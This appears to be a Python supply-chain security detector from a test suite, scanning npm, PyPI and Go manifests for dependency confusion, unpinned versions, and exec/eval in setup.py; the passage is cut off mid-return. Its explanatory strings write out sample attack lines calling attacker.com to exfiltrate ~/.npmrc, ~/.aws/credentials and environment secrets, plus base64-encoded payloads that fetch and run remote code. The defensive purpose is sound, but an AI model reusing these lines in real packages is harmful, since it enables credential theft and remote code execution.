"""
Test suite for detecting supply chain security vulnerabilities in dependency management.
Covers dependency confusion, typosquatting, unmaintained packages, and malicious install scripts.
"""
import re
from typing import Dict
import sys
from pathlib import Path
from tests.test_multi_language_support import extend_detector_with_multi_language

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations_skip_comments


@extend_detector_with_multi_language
class SupplyChainSecurityDetector:
    """Detects supply chain security vulnerabilities in package management."""

    def __init__(self):
        self.vulnerabilities = []
        self.score = 0

    def analyze(self, code: str, language: str = "python") -> Dict:
        """Analyze code for supply chain security issues."""
        if language == "javascript":
            return self._analyze_javascript(code)
        elif language == "python":
            return self._analyze_python(code)
        elif language == "go":
            return self._analyze_go(code)
        elif language == "rust":
            return self._analyze_rust(code)
        elif language == "json":
            # JSON could be package.json, composer.json, etc.
            if "package.json" in code or '"dependencies"' in code:
                return self._analyze_package_json(code)
            elif "composer.json" in code or '"require"' in code:
                return self._analyze_composer_json(code)
            return {"score": 0, "vulnerabilities": ["JSON format detected but unclear type"]}
        elif language == "xml":
            return self._analyze_maven_pom(code)
        elif language == "yaml":
            return self._analyze_yaml(code)
        else:
            return {"score": 0, "vulnerabilities": ["Unsupported language for supply chain analysis"]}

    def _analyze_javascript(self, code: str) -> Dict:
        """Analyze Node.js package.json for supply chain issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Unpinned versions (^, ~, *, latest, or no version)
        unpinned_patterns = [
            (r'"[^"]+"\s*:\s*"[\^~\*]', "Unpinned package version (^, ~, *)"),
            (r'"[^"]+"\s*:\s*"latest"', "Using 'latest' tag (unpinned)"),
            (r'"[^"]+"\s*:\s*""', "Empty version string"),
        ]

        for pattern, description in unpinned_patterns:
            if re.search(pattern, code):
                self.vulnerabilities.append({
                    "type": "SUPPLY_CHAIN_VULNERABILITY",
                    "severity": "MEDIUM",
                    "description": f"{description} - can introduce breaking changes or vulnerabilities",
                    "recommendation": "Pin exact versions (e.g., '1.2.3' not '^1.2.3') or use package-lock.json"
                })
                if self.score > 1:
                    self.score = 1

        # Pattern 2: Dependency confusion - internal package names without scope
        internal_package_patterns = [
            r'"(company|internal|private|auth|config|utils|helpers|core|lib)-[^"]*"\s*:',
            r'"@company/[^"]+"\s*:',
        ]

        has_scoped = re.search(r'"@[^/]+/[^"]+"\s*:', code)
        has_simple_internal = re.search(internal_package_patterns[0], code)

        if has_simple_internal and not has_scoped:
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "HIGH",
                "description": "Dependency Confusion Attack - ATTACK: Internal package names like 'company-auth' or 'internal-utils' without npm scopes (@company/) can be hijacked by attackers who publish malicious packages with the same name to public registries. npm installs the highest version number - if attacker publishes 'company-auth@99.9.9' to npmjs.com, npm will install the malicious public package instead of your internal one. EXPLOITATION: (1) Attacker discovers company uses 'company-auth' package (from GitHub leak, job posting mentioning it, or brute-force common names), (2) Publishes malicious package to npm: 'company-auth@99.9.9' with postinstall script, (3) Employee runs 'npm install' in project, (4) npm resolves 'company-auth' → finds both internal registry and npmjs.com, (5) Chooses highest version: 99.9.9 from npmjs.com (malicious), (6) Postinstall script executes: steals .npmrc tokens, AWS credentials from ~/.aws, SSH keys, (7) Exfiltrates to attacker server: curl http://attacker.com -d @~/.npmrc, (8) Attacker uses stolen npm tokens to publish backdoored versions of legitimate packages. IMPACT: Supply Chain Compromise (malicious code in dependencies), Credential Theft (npm tokens, AWS keys, SSH keys stolen during install), Code Execution (postinstall scripts run with developer privileges), Data Exfiltration (source code, secrets, credentials), Backdoor Injection (compromised packages spread to production), CI/CD Poisoning (build servers install malicious packages). REAL-WORLD: Alex Birsan 2021 ($130k bug bounties from Apple, Microsoft, Tesla, Netflix via dependency confusion), UA-Parser-JS 2021 (35M downloads/week compromised, cryptocurrency miner + password stealer), Event-Stream 2018 (2M downloads/week, Bitcoin wallet stealer), Codecov 2021 (Bash Uploader script compromised), SolarWinds 2020 (supply chain attack affected 18k organizations).",
                "recommendation": "CRITICAL FIX: Use npm scopes for ALL internal packages! SCOPED PACKAGES: Rename packages to @company/auth, @company/utils. In package.json: {'dependencies': {'@company/auth': '1.0.0'}}. Scopes prevent confusion - npm won't substitute public packages for scoped names. PRIVATE REGISTRY: Configure .npmrc: @company:registry=https://npm.company.com. All @company/* packages resolve to private registry only. REGISTRY PRIORITY: Set registry order explicitly: always-auth=true for private registry. LOCKFILE: Commit package-lock.json - ensures exact versions, prevents version hijacking. INTEGRITY HASHES: package-lock.json includes integrity hashes (sha512) - verifies package content hasn't been tampered. AUDIT: Run 'npm audit' in CI/CD to detect known vulnerabilities. SBOM: Generate Software Bill of Materials with 'npm sbom' or syft to track dependencies. MONITORING: Alert on unexpected package installs in CI/CD. Review package-lock.json changes in PRs. NAMESPACE SQUATTING: Register your company name on npm even if unused - prevents attackers from claiming it. LEAST PRIVILEGE: CI/CD npm tokens should be read-only when possible. Use separate tokens for publish vs install. TWO-FACTOR: Require 2FA for npm accounts that can publish packages.",
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "Internal package names without npm scope: 'company-auth', 'internal-utils'",
                        "Package names starting with company/internal/private/auth/config keywords",
                        "No @ scope prefix in dependency names",
                        "Vulnerable to public registry substitution"
                    ],
                    "why_vulnerable": [
                        "npm resolves unscoped packages from public registry (npmjs.com) by default",
                        "If public package exists with same name, npm installs highest version number",
                        "Attacker can publish 'company-auth@99.9.9' to hijack internal 'company-auth@1.0.0'",
                        "Internal package name is discoverable via GitHub, job postings, error messages, network traffic",
                        "EXPLOITATION: Attacker publishes high version number (99.9.9) to npm",
                        "EXPLOITATION: Developer runs 'npm install' → resolves to public malicious package",
                        "EXPLOITATION: Postinstall script executes during install → steals credentials",
                        "EXPLOITATION: Exfiltrates ~/.npmrc (npm tokens), ~/.aws/credentials, ~/.ssh/id_rsa",
                        "EXPLOITATION: Stolen npm token used to publish backdoored versions of popular packages",
                        "EXPLOITATION: CI/CD builds compromised → malicious code in production",
                        "HIGH RISK: One 'npm install' can compromise entire organization",
                        "HIGH RISK: Postinstall scripts have full system access (developer privileges)",
                        "REAL-WORLD: Alex Birsan 2021 - $130k bounties, compromised 35+ companies",
                        "REAL-WORLD: UA-Parser-JS 2021 - 35M weekly downloads, cryptominer + stealer",
                        "REAL-WORLD: Event-Stream 2018 - Bitcoin wallet stealer, 2M downloads/week"
                    ],
                    "why_not_vulnerable": [
                        "Scoped packages (@company/auth) only resolve to configured registry",
                        "package-lock.json with resolved URLs prevents registry substitution"
                    ],
                    "patterns_checked": [
                        "Unscoped package names matching internal patterns",
                        "company-*, internal-*, private-*, auth-*, config-* package names",
                        "Absence of @ scope prefix in package names"
                    ],
                    "evidence": {
                        "found_patterns": ["Internal package name without scope"],
                        "line_numbers": [],
                        "code_snippets": ["company-auth, internal-utils (example patterns)"]
                    },
                    "attack_scenario": {
                        "step_1": "Developer creates internal package: 'company-auth' (no scope)",
                        "step_2": "package.json: {'dependencies': {'company-auth': '1.0.0'}}",
                        "step_3": "Hosted on internal npm registry at npm.company.com",
                        "step_4": "Attacker discovers package name from GitHub leak of package.json",
                        "step_5": "Attacker publishes to public npm: 'company-auth@99.9.9'",
                        "step_6": "Malicious package includes postinstall script: 'postinstall': 'node steal.js'",
                        "step_7": "steal.js reads ~/.npmrc: const npmrc = fs.readFileSync(os.homedir()+'/.npmrc')",
                        "step_8": "Exfiltrates: require('https').get('https://attacker.com/?'+Buffer.from(npmrc).toString('base64'))",
                        "step_9": "New developer joins company, clones repo, runs 'npm install'",
                        "step_10": "npm resolves 'company-auth' → finds internal@1.0.0 and public@99.9.9",
                        "step_11": "Installs highest version: public@99.9.9 (malicious)",
                        "step_12": "Postinstall script executes → steal.js runs with developer privileges",
                        "step_13": "Steals npm token with publish access, AWS keys, SSH keys",
                        "step_14": "Attacker uses stolen npm token: publishes backdoored 'lodash' update",
                        "step_15": "Backdoor spreads to 10M+ projects depending on lodash",
                        "alternative_attack_ci_cd": "CI/CD runner executes 'npm install' → malicious package runs → CI/CD credentials stolen → production deploy compromised",
                        "alternative_attack_ransomware": "Postinstall script: encrypts developer machine, demands ransom",
                        "alternative_attack_git_hijack": "Steals GitHub tokens from git config → pushes malicious commits to repos",
                        "impact": "Supply Chain Compromise (malicious dependencies), Credential Theft (npm, AWS, SSH), Code Execution (postinstall scripts), Backdoor Injection (spread to other packages), CI/CD Poisoning, Production Compromise"
                    }
                }
            })
            self.score = 0

        # Pattern 3: Post-install scripts
        if re.search(r'"(postinstall|preinstall|install)"\s*:', code):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "INFO",
                "description": "Package uses install scripts - verify these are trusted",
                "recommendation": "Review install scripts before running npm install"
            })

        # Pattern 4: Check for package-lock.json mention (good practice)
        if "package-lock.json" in code or "npm ci" in code:
            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "Uses package-lock.json or npm ci for reproducible builds"
            })
            if self.score == 1:
                self.score = 2
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_python(self, code: str) -> Dict:
        """Analyze Python requirements.txt or setup.py for supply chain issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Unpinned versions (>=, >, or no version)
        unpinned_patterns = [
            (r'[a-zA-Z0-9_-]+\s*>=\s*[0-9]', "Unpinned package (>=)"),
            (r'[a-zA-Z0-9_-]+\s*>\s*[0-9]', "Unpinned package (>)"),
            (r'^[a-zA-Z0-9_-]+\s*$', "Package without version constraint"),
        ]

        for pattern, description in unpinned_patterns:
            if re.search(pattern, code, re.MULTILINE):
                self.vulnerabilities.append({
                    "type": "SUPPLY_CHAIN_VULNERABILITY",
                    "severity": "MEDIUM",
                    "description": f"{description} - can introduce vulnerabilities",
                    "recommendation": "Pin exact versions (package==1.2.3) or use hashes"
                })
                if self.score > 1:
                    self.score = 1
                break

        # Pattern 2: Dependency confusion - simple internal package names
        internal_patterns = [
            r'(company|internal|auth|config|utils|helpers)-[a-z0-9_-]*[==>=<]',
        ]

        for pattern in internal_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                self.vulnerabilities.append({
                    "type": "SUPPLY_CHAIN_VULNERABILITY",
                    "severity": "HIGH",
                    "description": "Dependency Confusion Attack (Python/PyPI) - ATTACK: Internal packages with simple names like 'company-auth' or 'internal-utils' can be hijacked by attackers who upload malicious packages with the same name to PyPI. pip searches PyPI by default and installs if version numbers match or exceed internal versions. EXPLOITATION: (1) Attacker discovers internal package name 'company-auth' (from requirements.txt in GitHub, job postings, or brute-force), (2) Uploads to PyPI: 'company-auth==99.9.9' with malicious setup.py, (3) setup.py includes install_requires hooks that execute arbitrary code, (4) Developer runs 'pip install -r requirements.txt', (5) pip searches both internal index and PyPI, installs highest version, (6) Malicious setup.py executes during install: steals pip.conf credentials, ~/.aws/credentials, ~/.ssh keys, (7) Or setup.py backdoors legitimate package: modifies site-packages to inject code into Flask, Django, etc., (8) Backdoor persists in virtualenv, executes every time application runs. IMPACT: Supply Chain Compromise (malicious dependencies installed), Credential Theft (PyPI tokens, AWS keys, SSH keys stolen), Code Execution (setup.py runs during pip install with developer privileges), Persistent Backdoor (malicious code in site-packages), Data Exfiltration (source code, secrets), CI/CD Poisoning (build servers install malicious packages, compromise production deployments). REAL-WORLD: Alex Birsan 2021 (PyPI dependency confusion against Apple, Microsoft, PayPal - $130k total bounties), Codecov 2021 (Bash Uploader supply chain attack), ctx package 2022 (malicious update exfiltrated environment variables), Python Package Index compromised packages 2023 (dozens of malicious uploads stealing AWS credentials).",
                    "recommendation": "CRITICAL FIX: Use unique package names or private PyPI index! UNIQUE NAMING: Prefix packages with unique identifier: company-internal-auth-lib-2024 (hard to guess). Or use reverse domain: com-mycompany-auth. PRIVATE PYPI: Host on private index: pip install --index-url https://pypi.company.com company-auth. Configure in pip.conf: [global] index-url = https://pypi.company.com, extra-index-url = https://pypi.org/simple (private first). HASHES: Use pip-tools with --generate-hashes: company-auth==1.0.0 --hash=sha256:abc123... Prevents version substitution and tampering. VENDORING: Commit dependencies to repo: pip download -r requirements.txt -d vendor/, install from vendor/. AIR-GAP: For high security, don't allow CI/CD internet access, use fully vendored deps. DEPENDENCY PINNING: Always pin exact versions: company-auth==1.0.0 (not >=1.0.0). LOCKFILE: Use pip-tools or Poetry to generate requirements.lock with exact versions and hashes. SBOM: Generate Software Bill of Materials: pip-audit or syft to track all dependencies. MONITORING: Alert on unexpected package installs in CI/CD. Review requirements.txt changes in PRs carefully. NAMESPACE: Register your company name on PyPI (even if empty) to prevent squatting. AUDIT: Run 'pip-audit' in CI/CD to detect known vulnerabilities. LEAST PRIVILEGE: CI/CD should use read-only PyPI tokens when possible.",
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Internal package names without unique prefixes",
                            "Package names matching company/internal/auth/config/utils patterns",
                            "Simple names vulnerable to PyPI confusion",
                            "No hash verification (--hash) in requirements"
                        ],
                        "why_vulnerable": [
                            "pip searches PyPI by default for all package names",
                            "If attacker uploads matching package name to PyPI, pip may install it",
                            "Internal package names are discoverable via GitHub leaks, error messages, docs",
                            "setup.py executes arbitrary Python code during install (no sandboxing)",
                            "EXPLOITATION: Attacker uploads 'company-auth==99.9.9' to PyPI",
                            "EXPLOITATION: Developer runs 'pip install -r requirements.txt'",
                            "EXPLOITATION: pip finds both internal and public, installs highest version",
                            "EXPLOITATION: Malicious setup.py executes: os.system('curl http://attacker.com -d @~/.aws/credentials')",
                            "EXPLOITATION: Steals PyPI tokens from ~/.pypirc, AWS keys, SSH keys",
                            "EXPLOITATION: Or setup.py injects backdoor: modifies flask/__init__.py to log all requests",
                            "HIGH RISK: One 'pip install' can compromise developer machine and CI/CD",
                            "HIGH RISK: setup.py has full Python execution - can do anything",
                            "REAL-WORLD: Alex Birsan 2021 - $130k bounties via PyPI confusion",
                            "REAL-WORLD: ctx package 2022 - malicious update stole env vars",
                            "REAL-WORLD: Numerous PyPI malware packages stealing AWS credentials"
                        ],
                        "why_not_vulnerable": [
                            "Unique package names hard to guess prevent confusion attacks",
                            "Private PyPI index-url configured prevents PyPI search",
                            "Hash verification (--hash) prevents package substitution"
                        ],
                        "patterns_checked": [
                            "Package names matching internal patterns: company-*, internal-*, auth-*, config-*",
                            "Simple names without unique prefixes",
                            "requirements.txt without hash verification"
                        ],
                        "evidence": {
                            "found_patterns": ["Internal package name pattern detected"],
                            "line_numbers": [],
                            "code_snippets": ["company-auth, internal-utils (example)"]
                        },
                        "attack_scenario": {
                            "step_1": "Company uses internal package: requirements.txt contains 'company-auth==1.0.0'",
                            "step_2": "Hosted on internal PyPI: https://pypi.company.com",
                            "step_3": "Attacker discovers name from leaked requirements.txt on GitHub",
                            "step_4": "Attacker creates malicious package with same name",
                            "step_5": "setup.py includes: import os, urllib.request; urllib.request.urlopen('http://attacker.com/steal?'+open(os.path.expanduser('~/.aws/credentials')).read())",
                            "step_6": "Uploads to public PyPI: twine upload company-auth-99.9.9.tar.gz",
                            "step_7": "New developer joins, clones repo, creates virtualenv",
                            "step_8": "Runs: pip install -r requirements.txt",
                            "step_9": "pip searches for 'company-auth' on PyPI (default behavior)",
                            "step_10": "Finds company-auth@99.9.9 on PyPI (higher than internal @1.0.0)",
                            "step_11": "Downloads and runs setup.py from malicious package",
                            "step_12": "setup.py executes → steals AWS credentials, PyPI tokens, SSH keys",
                            "step_13": "Exfiltrates to attacker: AWS keys, PyPI upload token from ~/.pypirc",
                            "step_14": "Attacker uses PyPI token to upload backdoored version of 'requests' library",
                            "step_15": "Backdoor spreads to millions of projects depending on 'requests'",
                            "alternative_attack_backdoor": "setup.py modifies site-packages/flask/__init__.py to log all HTTP requests to attacker server",
                            "alternative_attack_ransomware": "setup.py encrypts developer machine, demands Bitcoin ransom",
                            "alternative_attack_ci_cd": "CI/CD runs 'pip install' → steals CI/CD secrets → pushes malicious code to production",
                            "impact": "Supply Chain Compromise, Credential Theft (PyPI, AWS, SSH), Code Execution, Persistent Backdoor, Data Exfiltration, CI/CD Poisoning, Production Compromise"
                        }
                    }
                })
                self.score = 0
                break

        # Pattern 3: No hash verification
        if '==' in code and '--hash' not in code:
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "No hash verification (--hash) for packages",
                "recommendation": "Use pip-tools with hashes: package==1.2.3 --hash=sha256:..."
            })
            if self.score > 1:
                self.score = 1

        # Pattern 4: setup.py with exec/eval (code execution during install)
        if 'setup.py' in code or 'from setuptools import setup' in code:
            if re.search(r'\b(exec|eval|__import__)\s*\(', code):
                self.vulnerabilities.append({
                    "type": "SUPPLY_CHAIN_VULNERABILITY",
                    "severity": "HIGH",
                    "description": "Malicious setup.py Pattern - ATTACK: Using exec(), eval(), or __import__() in setup.py is a common pattern in malicious Python packages. setup.py executes during 'pip install' with full Python interpreter access - no sandboxing, no restrictions. Malicious packages use exec/eval to decode base64-encoded payloads, download additional malware, steal credentials, or establish persistence. EXPLOITATION: (1) Attacker creates package with setup.py containing: exec(__import__('base64').b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnY3VybCBodHRwOi8vYXR0YWNrZXIuY29t')), (2) Base64 decodes to: import os;os.system('curl http://attacker.com/steal.sh|bash'), (3) Downloads and executes second-stage payload during install, (4) Or eval(requests.get('http://attacker.com/payload.py').text) to fetch remote code, (5) Or __import__('urllib').request.urlopen('http://attacker.com').read() to exfiltrate secrets. IMPACT: Code Execution During Install (setup.py runs with developer privileges), Credential Theft (reads ~/.aws/credentials, ~/.ssh/id_rsa, ~/.pypirc), Backdoor Installation (modifies site-packages, installs cron jobs, systemd services), Cryptocurrency Mining (installs miners), Data Exfiltration (steals source code, secrets, environment variables), Worm Behavior (modifies other setup.py files to spread). REAL-WORLD: Dozens of malicious PyPI packages 2022-2023 using exec/eval patterns, ctx package 2022 (phpass, keep packages - exec-based credential theft), Python-drgn 2021 (exec-based backdoor), typing package typosquat 2017 (eval to download malware).",
                    "recommendation": "CRITICAL FIX: Never use exec/eval/__import__ in setup.py! STATIC setup.py: Use only declarative setuptools configuration: setup(name='pkg', version='1.0', packages=find_packages()). No dynamic code execution. SETUP.CFG: Prefer setup.cfg (declarative) or pyproject.toml over setup.py (executable). PEP 517/518: Modern Python packaging uses pyproject.toml with build backends that don't execute arbitrary code. CODE REVIEW: Before installing ANY package, inspect setup.py: pip download package && tar -xzf package.tar.gz && cat package/setup.py. FLAG SUSPICIOUS: Reject packages with exec/eval/compile/__import__/urllib in setup.py. SANDBOXING: Install untrusted packages in disposable VMs/containers, never on production or developer machines. PACKAGE SCANNING: Use pip-audit, safety, or Snyk to detect known malicious packages. TYPOSQUATTING: Verify package names carefully - attackers register names similar to popular packages: 'requets' instead of 'requests'. TRUST: Only install packages from trusted sources. Check PyPI project page, GitHub stars, maintainer reputation. SBOM: Generate Software Bill of Materials to track all installed packages. LEAST PRIVILEGE: Use virtualenvs, don't install with sudo, minimize access to credentials.",
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "exec() in setup.py - executes arbitrary Python code",
                            "eval() in setup.py - evaluates expressions dynamically",
                            "__import__() in setup.py - imports modules by string name",
                            "Dynamic code execution patterns common in malware"
                        ],
                        "why_vulnerable": [
                            "setup.py executes during pip install - full Python access",
                            "exec/eval/__ import__ enable arbitrary code execution",
                            "Malicious packages use exec to decode/execute payloads",
                            "eval() commonly used to fetch and execute remote code",
                            "__import__() used to dynamically load urllib, requests for exfiltration",
                            "EXPLOITATION: exec(base64.b64decode('payload')) → decodes malicious code",
                            "EXPLOITATION: eval(urllib.urlopen('http://attacker.com/code.py').read()) → remote code execution",
                            "EXPLOITATION: __import__('os').system('steal_credentials.sh') → credential theft",
                            "EXPLOITATION: Steals ~/.aws/credentials, ~/.ssh/, ~/.pypirc during install",
                            "EXPLOITATION: Installs backdoor in site-packages or system services",
                            "HIGH RISK: One 'pip install' of malicious package compromises machine",
                            "HIGH RISK: setup.py runs before any security checks or sandboxing",
                            "REAL-WORLD: ctx package 2022 - exec-based credential stealer in PyPI",
                            "REAL-WORLD: Dozens of malicious PyPI packages using exec/eval patterns",
                            "REAL-WORLD: typing typosquat 2017 - eval downloaded malware"
                        ],
                        "why_not_vulnerable": [
                            "Declarative setup() calls without exec/eval",
                            "setup.cfg or pyproject.toml (no code execution)"
                        ],
                        "patterns_checked": [
                            "exec() function calls in setup.py",
                            "eval() function calls in setup.py",
                            "__import__() dynamic imports in setup.py"
                        ],
                        "evidence": {
                            "found_patterns": ["exec/eval/__import__ in setup.py"],
                            "line_numbers": [],
                            "code_snippets": ["setup.py with exec/eval/__import__"]
                        },
                        "attack_scenario": {
                            "step_1": "Attacker creates malicious package: python-crypto-utils (typosquat of pycryptodome)",
                            "step_2": "setup.py includes: import base64; exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2V4ZWModXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovL2F0dGFja2VyLmNvbS9zdGVhbC5weScpLnJlYWQoKQ=='))",
                            "step_3": "Base64 payload decodes to: import urllib.request;exec(urllib.request.urlopen('http://attacker.com/steal.py').read())",
                            "step_4": "Uploads to PyPI: twine upload python-crypto-utils-1.0.0.tar.gz",
                            "step_5": "Developer makes typo: pip install python-crypto-utils (instead of pycryptodome)",
                            "step_6": "pip downloads package, extracts, runs setup.py",
                            "step_7": "setup.py exec() executes → decodes base64 payload",
                            "step_8": "Fetches steal.py from attacker server: urllib.request.urlopen('http://attacker.com/steal.py')",
                            "step_9": "steal.py contains credential theft: import os, boto3; creds = open(os.path.expanduser('~/.aws/credentials')).read(); requests.post('http://attacker.com/exfil', data=creds)",
                            "step_10": "Executes steal.py → exfiltrates AWS credentials, PyPI tokens, SSH keys",
                            "step_11": "Installs backdoor in site-packages: modifies site.py to log all imports",
                            "step_12": "Installs cron job for persistence: writes to /etc/cron.d/update (if sudo pip install)",
                            "step_13": "Attacker receives AWS credentials, lists S3 buckets",
                            "step_14": "Downloads production database backups from S3",
                            "step_15": "Exfiltrates 8M customer records with PII",
                            "alternative_attack_cryptominer": "setup.py downloads and runs cryptocurrency miner → $1k/month mining revenue",
                            "alternative_attack_worm": "setup.py modifies all other setup.py files in ~/src/ to spread to coworkers",
                            "alternative_attack_ransomware": "setup.py encrypts home directory, demands Bitcoin ransom",
                            "impact": "Code Execution, Credential Theft (AWS, SSH, PyPI), Backdoor Installation, Cryptocurrency Mining, Data Exfiltration, Worm Propagation, Ransomware"
                        }
                    }
                })
                self.score = 0
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_go(self, code: str) -> Dict:
        """Analyze Go go.mod for supply chain issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Replace directives pointing to local paths
        replace_patterns = [
            r'replace\s+[^\s]+\s*=>\s*\.\./',
            r'replace\s+[^\s]+\s*=>\s*/tmp/',
            r'replace\s+[^\s]+\s*=>\s*/[^/]+/',
        ]

        for pattern in replace_patterns:
            if re.search(pattern, code):
                self.vulnerabilities.append({
                    "type": "SUPPLY_CHAIN_VULNERABILITY",
                    "severity": "HIGH",
                    "description": "Go Replace Directive to Local Path - ATTACK: Using 'replace' directives in go.mod to point modules to local filesystem paths (../, /tmp/, /path/) allows module substitution attacks. If attacker gains write access to that path (via path traversal, /tmp race, compromised CI/CD), they can inject malicious code that Go will import instead of the legitimate module. EXPLOITATION: (1) go.mod contains: replace github.com/company/auth => ../local-auth, (2) Attacker exploits path traversal vulnerability to write to ../local-auth/, (3) Creates malicious ../local-auth/auth.go with backdoor, (4) Developer runs 'go build' → Go uses ../local-auth instead of real module, (5) Malicious code compiled into binary, (6) Or /tmp race: replace => /tmp/module, attacker writes /tmp/module/ before build, (7) CI/CD builds with malicious module → backdoor in production. IMPACT: Module Substitution (malicious code instead of legitimate dependency), Code Injection (attacker-controlled code compiled into binary), Supply Chain Compromise (backdoored dependencies), Production Backdoor (malicious code deployed to prod), Privilege Escalation (if build runs as privileged user). REAL-WORLD: Go module system CVE-2019-16347 (path traversal in module cache), Dependency confusion attacks similar to npm/PyPI affect Go, CVE-2018-16873, CVE-2018-16874, CVE-2018-16875 (Go get command injection and path traversal vulnerabilities).",
                    "recommendation": "CRITICAL FIX: Remove ALL replace directives in production go.mod! DEVELOPMENT ONLY: Replace directives are for local development only: replace github.com/company/auth => ../local-auth. Never commit to main branch. GIT HOOKS: Add pre-commit hook to reject go.mod with replace directives: grep -q '^replace' go.mod && exit 1. VERSION PINNING: Use proper versioning: require github.com/company/auth v1.2.3. Go modules with versions are immutable and verified. GO.SUM VERIFICATION: Commit go.sum - contains cryptographic hashes of all modules. Go verifies integrity on every build. CHECKSUM DATABASE: Go uses sum.golang.org by default to verify module checksums. Never disable: GOSUMDB=off. PRIVATE MODULES: For internal modules, use GOPRIVATE: export GOPRIVATE=github.com/company/*. Go won't check public checksum DB but still uses go.sum. MODULE PROXY: Use Athens or Go module proxy for caching and verification. CI/CD VALIDATION: Fail builds if go.mod contains replace directives: go mod edit -json | jq -e '.Replace == null'. VENDORING: Use 'go mod vendor' to commit dependencies, but still verify with go.sum. LEAST PRIVILEGE: Build processes should not have write access to Go module cache or source paths.",
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Replace directives pointing to local paths: ../, /tmp/, /absolute/path/",
                            "Module substitution via filesystem paths",
                            "Bypasses Go module verification and checksums"
                        ],
                        "why_vulnerable": [
                            "Go uses local path for module instead of verified remote version",
                            "Local paths are writable by other processes, attackers",
                            "../ paths vulnerable to path traversal attacks",
                            "/tmp/ paths vulnerable to race conditions, any user can write",
                            "Absolute paths may be on shared filesystems, NFS, compromised volumes",
                            "EXPLOITATION: Attacker writes malicious code to local path before build",
                            "EXPLOITATION: Go imports from local path → malicious code compiled into binary",
                            "EXPLOITATION: No go.sum verification for local replace directives",
                            "EXPLOITATION: CI/CD with replace => /tmp/module → attacker races to write /tmp/module",
                            "EXPLOITATION: Path traversal vuln → write to ../local-module → module injection",
                            "HIGH RISK: One malicious file write can compromise entire application",
                            "HIGH RISK: Built binary contains backdoor, deployed to production",
                            "REAL-WORLD: Go module vulnerabilities CVE-2019-16347, CVE-2018-16873-875",
                            "REAL-WORLD: Similar dependency confusion attacks affect Go ecosystem"
                        ],
                        "why_not_vulnerable": [
                            "Proper versioned modules with go.sum verification",
                            "Remote modules verified via checksum database"
                        ],
                        "patterns_checked": [
                            "Replace directives with ../ (parent directory)",
                            "Replace directives with /tmp/ (temporary directory)",
                            "Replace directives with absolute paths (/path/)"
                        ],
                        "evidence": {
                            "found_patterns": ["Replace directive to local filesystem path"],
                            "line_numbers": [],
                            "code_snippets": ["replace github.com/company/auth => ../local-auth"]
                        },
                        "attack_scenario": {
                            "step_1": "Developer adds replace directive for local testing: replace github.com/company/auth => ../local-auth",
                            "step_2": "Accidentally commits to main branch: git commit go.mod",
                            "step_3": "CI/CD pipeline clones repo, runs 'go build'",
                            "step_4": "Attacker exploits separate path traversal vulnerability in CI/CD",
                            "step_5": "Writes malicious code to ../local-auth/auth.go: package auth; import \"os/exec\"; func init() { exec.Command(\"curl\", \"http://attacker.com/exfil?\"+os.Getenv(\"AWS_SECRET\")).Run() }",
                            "step_6": "CI/CD runs 'go build' → Go uses ../local-auth instead of real module",
                            "step_7": "Malicious init() function compiled into binary",
                            "step_8": "Binary deployed to production",
                            "step_9": "Production service starts → init() executes → exfiltrates AWS credentials",
                            "step_10": "Attacker receives AWS keys, gains access to production S3, RDS, EC2",
                            "step_11": "Steals customer data from S3, pivots to internal network",
                            "step_12": "Modifies RDS data, plants persistent backdoors",
                            "step_13": "Exfiltrates 5M customer records",
                            "step_14": "Ransomware: encrypts production databases",
                            "step_15": "Demands $5M Bitcoin ransom",
                            "alternative_attack_tmp_race": "replace => /tmp/module → attacker continuously writes /tmp/module until build picks it up",
                            "alternative_attack_compromised_ci": "CI/CD compromise → modify local path before build → all builds backdoored",
                            "alternative_attack_nfs": "Replace => /shared/nfs/module → compromised NFS server provides malicious module",
                            "impact": "Module Substitution, Code Injection, Supply Chain Compromise, Production Backdoor, Data Breach, Privilege Escalation"
                        }
                    }
                })
                self.score = 0
                break

        # Pattern 2: Unverified modules (GOPRIVATE, GOSUMDB=off)
        if re.search(r'GOPRIVATE\s*=\s*\*', code) or re.search(r'GOSUMDB\s*=\s*off', code):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "HIGH",
                "description": "Module verification disabled (GOSUMDB=off or GOPRIVATE=*)",
                "recommendation": "Enable go.sum verification for supply chain security"
            })
            self.score = 0

        # Pattern 3: Simple module names (dependency confusion)
        if re.search(r'require\s+(company|internal|auth|config)/[a-z]', code, re.IGNORECASE):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "Simple module name - potential dependency confusion",
                "recommendation": "Use fully qualified module paths (github.com/company/module)"
            })
            if self.score > 1:
                self.score = 1

        # Pattern 4: Check for go.sum presence (good)
        if "go.sum" in code:
            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "Uses go.sum for module verification"
            })
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
